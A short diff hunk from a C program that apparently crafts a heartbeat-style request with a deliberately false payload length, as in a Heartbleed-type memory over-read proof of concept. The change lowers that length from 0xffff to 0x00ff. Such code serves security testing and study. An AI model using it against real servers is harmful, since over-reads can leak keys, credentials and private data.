@@ -26,7 +26,7 @@ int main(int argc, char *argv[]) {
 	char *payload = "Do or do not. There is no try !" ;
 	
 	// Paylaod length to send (not necesserely the right )
-	unsigned short int  false_payload_length = 0xffff;
+	unsigned short int  false_payload_length = 0x00ff;
 	
 	// Padding length
 	unsigned int padding_len = 16;
